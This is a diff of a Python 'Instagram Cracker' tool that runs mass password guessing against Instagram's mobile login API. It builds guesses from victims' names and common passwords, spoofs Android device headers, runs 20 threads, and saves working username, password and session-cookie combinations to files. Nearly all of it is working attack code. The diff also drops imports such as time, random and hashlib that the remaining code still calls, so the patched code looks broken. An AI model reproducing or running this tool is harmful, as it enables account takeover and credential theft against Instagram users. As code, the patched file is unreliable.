@@ -15,13 +15,7 @@ import requests
 import re
 import json
 import base64
-import random
 import sys
-import time
-import hashlib
-import uuid
-import urllib.request
-import requests
 import string
 import os
 import threading
@@ -37,362 +31,10 @@ loop = 0
 oks = []
 cps = []
 idz = []
-methods = []
 
 # Thread-safe locks
 counter_lock = threading.Lock()
 success_lock = threading.Lock()
-
-class main_crack:
-    def __init__(self):
-        self.retry_count = 0
-        self.max_retries = 3
-        self.id = []
-        self.file = ""
-        self.password_list = []
-    
-    def crack(self, id):
-        global methods
-        clear()
-        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/AJ.txt')
-        linex()
-        os.system('espeak -a 150 " ENTER YOUR FILE NAME"')
-        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
-        try:
-            # Use context manager for better file handling
-            with open(self.file, 'r', encoding='utf-8', errors='ignore') as f:
-                self.id = f.read().splitlines()
-            
-            # Check if file has content
-            if not self.id:
-                print(f'{G1}[{A}={G2}]{G2} FILE IS EMPTY...')
-                time.sleep(2)
-                self.retry_crack(id)
-                return
-                
-            # Get password list
-            self.get_passwords()
-            self.pasw()
-            
-        except FileNotFoundError:
-            print(f'{G1}[{A}={G2}]{G2} OPPS FILE NOT FOUND ...')
-            time.sleep(2)
-            self.retry_crack(id)
-            
-        except PermissionError:
-            print(f'{G1}[{A}={G2}]{G2} PERMISSION DENIED ...')
-            time.sleep(2)
-            self.retry_crack(id)
-            
-        except Exception as e:
-            print(f'{G1}[{A}={G2}]{G2} ERROR: {str(e)}')
-            time.sleep(2)
-            self.retry_crack(id)
-    
-    def get_passwords(self):
-        """Get password list from user"""
-        clear()
-        print(f'{G1}[{A}={G1}]{G1} PASSWORD PATTERN SETUP')
-        linex()
-        print(f'{G1}[{A}1{G2}]{G2} Default Password List')
-        print(f'{G1}[{A}2{G2}]{G2} Custom Password File')
-        print(f'{G1}[{A}3{G2}]{G2} Manual Entry')
-        linex()
-        
-        choice = input(f'{G1}[{A}?{G2}]{G2} Select Option {A}:{G2} ')
-        
-        if choice == '1':
-            # Default password list
-            self.password_list = [
-                "firstlast", "FirstLast", "first123", "First123",
-                "firstlast123", "FirstLast123", "lastfirst", "LastFirst",
-                "name123", "Name123", "firstname", "FirstName",
-                "lastname", "LastName", "123456", "12345678",
-                "password", "Password", "admin", "Admin",
-                "iloveyou", "Iloveyou", "qwerty", "Qwerty",
-                "welcome", "Welcome", "monkey", "Monkey"
-            ]
-            print(f'{G1}[{A}+{G2}]{G2} Loaded {len(self.password_list)} default passwords')
-            
-        elif choice == '2':
-            # Load from file
-            pass_file = input(f'{G1}[{A}?{G2}]{G2} Password File Name {A}:{G2} ')
-            try:
-                with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
-                    self.password_list = [line.strip() for line in f if line.strip()]
-                print(f'{G1}[{A}+{G2}]{G2} Loaded {len(self.password_list)} passwords from file')
-            except:
-                print(f'{G1}[{A}!{G2}]{G2} Failed to load file, using default')
-                self.password_list = ["123456", "password", "12345678", "qwerty"]
-                
-        elif choice == '3':
-            # Manual entry
-            print(f'{G1}[{A}+{G2}]{G2} Enter passwords (comma separated)')
-            manual_pass = input(f'{G1}[{A}?{G2}]{G2} Passwords {A}:{G2} ')
-            self.password_list = [p.strip() for p in manual_pass.split(',')]
-            print(f'{G1}[{A}+{G2}]{G2} Loaded {len(self.password_list)} passwords')
-            
-        else:
-            print(f'{G1}[{A}!{G2}]{G2} Invalid choice, using default')
-            self.password_list = ["123456", "password"]
-            
-        time.sleep(2)
-    
-    def generate_passwords_for_user(self, user_info):
-        """Generate password patterns for a specific user"""
-        passwords = []
-        
-        # Extract user info
-        if '|' in user_info:
-            parts = user_info.split('|')
-            uid = parts[0].strip()
-            if len(parts) > 1:
-                name = parts[1].strip()
-            else:
-                name = uid
-        else:
-            uid = user_info.strip()
-            name = uid
-        
-        # Split name into first and last if possible
-        name_parts = name.split()
-        if len(name_parts) >= 2:
-            fs = name_parts[0]  # First name
-            ls = name_parts[-1]  # Last name
-        else:
-            fs = name
-            ls = name
-        
-        # Generate passwords using patterns
-        for pw in self.password_list:
-            # Replace patterns in password
-            ps = pw.replace('first', fs.lower()).replace('First', fs)
-            ps = ps.replace('last', ls.lower()).replace('Last', ls)
-            ps = ps.replace('name', name.lower()).replace('Name', name)
-            
-            # Add numeric variations
-            passwords.extend([
-                ps,
-                ps + "123",
-                ps + "1234",
-                ps + "12345",
-                ps + "123456",
-                ps + "@123",
-                ps + "!@#",
-                ps + "2024",
-                ps + "2023",
-                ps + "2022",
-            ])
-        
-        # Add UID-based passwords
-        passwords.extend([
-            uid,
-            uid[:6],
-            uid[:8],
-            fs.lower(),
-            fs.lower() + "123",
-            ls.lower(),
-            ls.lower() + "123",
-            name.lower(),
-            name.lower() + "123",
-        ])
-        
-        # Remove duplicates
-        return list(set(passwords))
-    
-    def pasw(self):
-        """Password cracking method"""
-        clear()
-        print(f'\n{G1}[{A}+{G1}]{G1} LOADING {len(self.id)} IDS...')
-        print(f'{G1}[{A}+{G1}]{G1} PASSWORD PATTERNS: {len(self.password_list)}')
-        linex()
-        
-        # Reset counters
-        global loop, oks, cps
-        with counter_lock:
-            loop = 0
-        with success_lock:
-            oks.clear()
-        cps.clear()
-        
-        total_users = len(self.id)
-        start_time = time.time()
-        
-        # Process each user
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            futures = []
-            
-            for user_info in self.id:
-                # Generate passwords for this user
-                user_passwords = self.generate_passwords_for_user(user_info)
-                
-                # Get UID
-                if '|' in user_info:
-                    uid = user_info.split('|')[0].strip()
-                else:
-                    uid = user_info.strip()
-                
-                # Submit task
-                future = executor.submit(
-                    self.crack_single_user, 
-                    uid, 
-                    user_passwords, 
-                    total_users
-                )
-                futures.append(future)
-            
-            # Wait for completion
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except KeyboardInterrupt:
-                    print(f"\n{G1}[{A}!{G2}]{G2} Interrupted by user!")
-                    executor.shutdown(wait=False)
-                    break
-                except Exception as e:
-                    print(f"\n{G1}[{A}!{G2}]{G2} Error: {e}")
-        
-        # Display results
-        end_time = time.time()
-        execution_time = end_time - start_time
-        
-        clear()
-        print(f"\n{G1}[{A}={G1}]{G1} CRACKING COMPLETED!")
-        linex()
-        print(f"{G1}[{A}✓{G2}]{G2} Total Users: {total_users}")
-        print(f"{G1}[{A}✓{G2}]{G2} Success: {len(oks)}")
-        print(f"{G1}[{A}✗{G2}]{G2} Failed: {len(cps)}")
-        print(f"{G1}[{A}⏱️{G2}]{G2} Time: {execution_time:.2f}s")
-        print(f"{G1}[{A}🚀{G2}]{G2} Speed: {total_users/execution_time:.2f} users/s")
-        linex()
-        
-        if len(oks) > 0:
-            print(f"{G1}[{A}🎉{G2}]{G2} SUCCESSFUL ACCOUNTS SAVED!")
-            # Show first few successes
-            print(f"{G1}[{A}+{G2}]{G2} First 5 successes:")
-            for i, uid in enumerate(oks[:5]):
-                print(f"  {G1}[{A}{i+1}{G2}]{G2} {uid}")
-        
-        input(f"\n{G1}[{A}!{G2}]{G2} PRESS ENTER TO RETURN TO MENU...")
-    
-    def crack_single_user(self, uid, passwords, total_users):
-        """Crack a single user account"""
-        with counter_lock:
-            global loop
-            loop += 1
-            progress = loop
-            percentage = (progress / float(total_users) * 100) if total_users > 0 else 0
-        
-        colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m"]
-        color = random.choice(colors)
-        
-        sys.stdout.write(f"\r{color}[FILE CRACK] {progress}/{total_users} [{percentage:.1f}%] - {uid}")
-        sys.stdout.flush()
-        
-        # Try to crack with each password
-        for pw in passwords[:50]:  # Limit to first 50 passwords for speed
-            if self.try_login(uid, pw):
-                with success_lock:
-                    oks.append(uid)
-                return True
-        
-        with success_lock:
-            cps.append(uid)
-        return False
-    
-    def try_login(self, uid, pw):
-        """Try to login with given credentials"""
-        try:
-            session = requests.Session()
-            device_id = f"android-{uuid.uuid4().hex[:16]}"
-            family_device_id = str(uuid.uuid4())
-            
-            # Generate hashes
-            first_hash = hashlib.md5()
-            first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
-            first_hex = first_hash.hexdigest()
-            
-            second_hash = hashlib.md5()
-            second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
-            android_id_hash = second_hash.hexdigest()[:16]
-            
-            # User agent
-            useragent = f'Instagram {random.randint(111, 999)}.0.0.{random.randint(1, 99)}.{random.randint(1, 9)} Android ({random.randint(21, 31)}/{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}; {random.randint(280, 1080)}x{random.randint(720, 1920)}; samsung; SM-G973F; samsung; {random.choice(["exynos9820", "sm6150"])}; en_US; {random.randint(100000000, 999999999)})'
-            
-            # Headers
-            headers = {
-                'user-agent': useragent,
-                'x-ig-device-id': device_id,
-                'x-ig-family-device-id': family_device_id,
-                'x-ig-android-id': f'android-{android_id_hash}',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            }
-            
-            # Prepare login data
-            timestamp = int(time.time())
-            encoded_username = urllib.parse.quote(uid)
-            encoded_password = urllib.parse.quote(pw)
-            encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
-            
-            # Simplified params for faster testing
-            params_dict = {
-                "username": encoded_username,
-                "password": encrypted_password,
-                "device_id": f"android-{android_id_hash}",
-            }
-            
-            params_json = json.dumps(params_dict)
-            encoded_params = urllib.parse.quote(params_json)
-            encode = f'params={encoded_params}'
-            
-            # Make request
-            response = session.post(
-                'https://i.instagram.com/api/v1/accounts/login/',
-                data=encode,
-                headers=headers,
-                timeout=10
-            )
-            
-            if response.status_code == 200 and 'logged_in_user' in response.text:
-                print(f"\n{G1}[{A}✓{G2}]{G2} SUCCESS: {uid} | {pw}")
-                self.save_success(uid, pw, response.text)
-                return True
-                
-        except Exception:
-            pass
-        
-        return False
-    
-    def save_success(self, uid, pw, response_text):
-        """Save successful login"""
-        try:
-            # Try to extract cookies
-            cookies = ""
-            if 'sessionid' in response_text:
-                match = re.search(r'"sessionid":"([^"]+)"', response_text)
-                if match:
-                    cookies = f"sessionid={match.group(1)}"
-            
-            # Save to file
-            with open("/sdcard/SUCCESS_ACCOUNTS.txt", "a", encoding='utf-8') as f:
-                f.write(f"{uid}|{pw}|{cookies}\n")
-                
-        except Exception:
-            pass
-    
-    def retry_crack(self, id):
-        """Helper method to retry the crack process"""
-        self.retry_count += 1
-        if self.retry_count >= self.max_retries:
-            print(f'{G1}[{A}={G2}]{G2} MAXIMUM RETRIES REACHED. RETURNING TO MENU...')
-            time.sleep(2)
-            return
-            
-        os.system('clear')
-        print(logo)
-        print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
-        time.sleep(2)
-        self.crack(id)
 
 def clear():
     """Cross-platform terminal screen clearing"""
@@ -406,7 +48,81 @@ def linex():
     """Print decorative line separator"""
     print(f"\033[1;97m{'='*56}")
 
-def crack(uid, password_list, total_count):
+def generate_device_hash(uid, pw):
+    """Generate device hash for Instagram API"""
+    hash_obj = hashlib.md5()
+    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
+    hex_digest = hash_obj.hexdigest()
+    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
+    return hash_obj.hexdigest()
+
+def get_password_patterns(uid, name=None):
+    """Generate password patterns based on UID and name"""
+    passwords = []
+    
+    # If name is provided, extract first and last name
+    if name and '|' in name:
+        name = name.split('|')[1].strip()
+    
+    if name:
+        # Split name into first and last
+        name_parts = name.split()
+        if len(name_parts) >= 2:
+            fs = name_parts[0]  # First name
+            ls = name_parts[-1] # Last name
+        else:
+            fs = name
+            ls = name
+        
+        # Base password patterns
+        base_patterns = [
+            'first', 'First', 'firstlast', 'FirstLast',
+            'lastfirst', 'LastFirst', 'first123', 'First123',
+            'name', 'Name', 'name123', 'Name123',
+            'firstname', 'FirstName', 'lastname', 'LastName'
+        ]
+        
+        # Generate password variations
+        for pattern in base_patterns:
+            pw = pattern.replace('first', fs.lower()).replace('First', fs)
+            pw = pw.replace('last', ls.lower()).replace('Last', ls)
+            pw = pw.replace('name', name.lower()).replace('Name', name)
+            passwords.append(pw)
+            
+            # Add numeric variations
+            passwords.extend([
+                pw + '123',
+                pw + '1234',
+                pw + '12345',
+                pw + '123456',
+                pw + '@123',
+                pw + '!@#',
+                '123' + pw,
+                pw + '2024',
+                pw + '2023'
+            ])
+    
+    # Always add UID-based patterns
+    passwords.extend([
+        uid,
+        uid[:6],
+        uid[:8],
+        '123456',
+        '12345678',
+        'password',
+        'Password',
+        'qwerty',
+        'admin',
+        'welcome',
+        'iloveyou',
+        'monkey',
+        '57273200'
+    ])
+    
+    # Remove duplicates
+    return list(set(passwords))[:50]  # Limit to 50 passwords
+
+def crack(uid, password_list, total_count, name=None):
     """Enhanced Instagram account cracking function"""
     
     # Thread-safe counter increment
@@ -481,6 +197,7 @@ def crack(uid, password_list, total_count):
             'x-ig-app-id': '3419628305025917',
             'connection': 'keep-alive'
             }
+            
             # Generate timestamp for password
             timestamp = int(time.time())
         
@@ -490,6 +207,7 @@ def crack(uid, password_list, total_count):
         
             # Generate encrypted password format
             encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
+            
             # Prepare the encoded data
             params_dict = {
             "client_input_params": {
@@ -531,6 +249,7 @@ def crack(uid, password_list, total_count):
                 "ar_event_source": "login_home_page"
             }
         }
+        
             # Convert params to JSON string and URL encode
             params_json = json.dumps(params_dict)
             encoded_params = urllib.parse.quote(params_json)
@@ -540,15 +259,19 @@ def crack(uid, password_list, total_count):
         
             # Update content-length in headers
             headers['content-length'] = str(len(encode))
+            
             # login url 
             url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
+            
             # Make API request
             response = session.post(
                 url, 
                 data=encode, 
                 headers=headers, 
-                allow_redirects=True
+                allow_redirects=True,
+                timeout=30
             )
+            
             # Check response
             if 'logged_in_user' in response.text:
                 print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
@@ -556,17 +279,20 @@ def crack(uid, password_list, total_count):
                    decoded = json.loads(base64.urlsafe_b64decode(match.group(1).split('Bearer IGT:2:')[1].ljust(4, '=')))
                    cookies = ';'.join(f'{k}={v}' for k,v in decoded.items())
                    print(cookies)
-                   open("/sdcard/SUMON_INS_TTTTT.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
+                   with open("/sdcard/SUMON_INS_TTTTT.txt","a") as f:
+                       f.write(uid+"|"+pw+"|"+cookies+"\n")
                    with success_lock:
                        oks.append(uid)
                    return True       
             elif 'challenge_required' in response.text:
-                open("/sdcard/SUMON_INS_CH.txt","a").write(uid+"|"+pw+"\n")
+                with open("/sdcard/SUMON_INS_CH.txt","a") as f:
+                    f.write(uid+"|"+pw+"\n")
                 with success_lock:
                     cps.append(uid)
                 continue
             elif 'checkpoint_required' in response.text:
-                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
+                with open("/sdcard/SUMON_INS_CP.txt","a") as f:
+                    f.write(uid+"|"+pw+"\n")
                 with success_lock:
                     cps.append(uid)
                 continue
@@ -578,12 +304,12 @@ def crack(uid, password_list, total_count):
     except requests.exceptions.ConnectionError:
         time.sleep(5)
         return False
-    except requests.exceptions.RequestException as e:
+    except requests.exceptions.RequestException:
         return False
     except KeyboardInterrupt:
         print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
-    except Exception as e:
+    except Exception:
         return False
     
     return False
@@ -596,22 +322,6 @@ def generate_random_ids(limit):
         idz.append(random_id)
     return idz
 
-def get_password_patterns(uid):
-    """Generate password patterns based on UID"""
-    # Extract name parts from UID if available
-    # For random numbers, use numeric patterns
-    return [
-        uid[:6],     # First 6 digits
-        uid[:8],     # First 8 digits
-        uid,         # Full number
-        '57273200',  # Static common password
-        '123456',
-        '12345678',
-        'password',
-        uid + '123',
-        uid[:4] + '1234',
-    ]
-
 def random_number():
     """Main random number cloning function"""
     clear()
@@ -622,8 +332,10 @@ def random_number():
     print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
     print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
     linex()
+    
     # Get user input
     code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
+    
     # get user limit
     try:
         limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
@@ -704,9 +416,101 @@ def random_number():
     input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")
 
 def file_crack():
-    """File-based cracking option"""
-    cracker = main_crack()
-    cracker.crack(0)
+    """File-based cracking function"""
+    clear()
+    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/AJ.txt')
+    linex()
+    
+    # Voice prompt
+    try:
+        os.system('espeak -a 150 "ENTER YOUR FILE NAME"')
+    except:
+        pass
+    
+    file_name = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
+    
+    try:
+        # Read the file
+        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
+            user_list = f.read().splitlines()
+        
+        if not user_list:
+            print(f'{G1}[{A}={G2}]{G2} FILE IS EMPTY...')
+            time.sleep(2)
+            return
+        
+        print(f'\n{G1}[{A}+{G1}]{G1} LOADED {len(user_list)} USERS')
+        
+        # Reset counters
+        global loop, oks, cps
+        with counter_lock:
+            loop = 0
+        with success_lock:
+            oks.clear()
+        cps.clear()
+        
+        start_time = time.time()
+        
+        # Process users
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = []
+            
+            for user_entry in user_list:
+                # Parse user entry (format: username|name)
+                if '|' in user_entry:
+                    uid, name = user_entry.split('|', 1)
+                    uid = uid.strip()
+                    name = name.strip()
+                else:
+                    uid = user_entry.strip()
+                    name = None
+                
+                # Generate passwords for this user
+                password_patterns = get_password_patterns(uid, name)
+                
+                # Submit task
+                future = executor.submit(crack, uid, password_patterns, len(user_list), name)
+                futures.append(future)
+            
+            # Wait for completion
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except KeyboardInterrupt:
+                    print(f"\n{G1}[{A}!{G2}]{G2} Interrupted by user!")
+                    executor.shutdown(wait=False)
+                    break
+                except Exception as e:
+                    print(f"\n{G1}[{A}!{G2}]{G2} Error: {e}")
+        
+        # Display results
+        end_time = time.time()
+        execution_time = end_time - start_time
+        
+        clear()
+        print(f"\n{G1}[{A}={G1}]{G1} FILE CRACKING COMPLETED!")
+        linex()
+        print(f"{G1}[{A}✓{G2}]{G2} Total Users: {len(user_list)}")
+        print(f"{G1}[{A}✓{G2}]{G2} Success: {len(oks)}")
+        print(f"{G1}[{A}✗{G2}]{G2} Failed: {len(cps)}")
+        print(f"{G1}[{A}⏱️{G2}]{G2} Time: {execution_time:.2f}s")
+        print(f"{G1}[{A}🚀{G2}]{G2} Speed: {len(user_list)/execution_time:.2f} users/s")
+        linex()
+        
+        if len(oks) > 0:
+            print(f"{G1}[{A}🎉{G2}]{G2} SUCCESSFUL ACCOUNTS SAVED!")
+        
+        input(f"\n{G1}[{A}!{G2}]{G2} PRESS ENTER TO RETURN TO MENU...")
+        
+    except FileNotFoundError:
+        print(f'{G1}[{A}={G2}]{G2} FILE NOT FOUND ...')
+        time.sleep(2)
+        print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
+        time.sleep(2)
+        file_crack()
+    except Exception as e:
+        print(f'{G1}[{A}={G2}]{G2} ERROR: {str(e)}')
+        time.sleep(2)
 
 def menu():
     """Interactive main menu"""
@@ -751,20 +555,6 @@ def menu():
             print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, 3, or 4.")
             time.sleep(2)
 
-# ASCII logo
-logo = f"""
-{G1}╔══════════════════════════════════════════════════════╗
-{G1}║    ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗    ║
-{G1}║    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝    ║
-{G1}║    ██║██╔██╗ ██║███████╗   ██║   ███████║██║         ║
-{G1}║    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║         ║
-{G1}║    ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╗    ║
-{G1}║    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ║
-{G1}║    {A}Instagram Cracker v2.0 - Enhanced Edition       {G1}║
-{G1}║    {A}Author: BITHIKA - All rights reserved           {G1}║
-{G1}╚══════════════════════════════════════════════════════╝
-"""
-
 if __name__ == "__main__":
     try:
         # Check for required modules
@@ -781,11 +571,6 @@ if __name__ == "__main__":
             print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
             print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
             sys.exit(1)
-        
-        # Display logo
-        clear()
-        print(logo)
-        time.sleep(2)
         
         # Start the main menu
         menu()
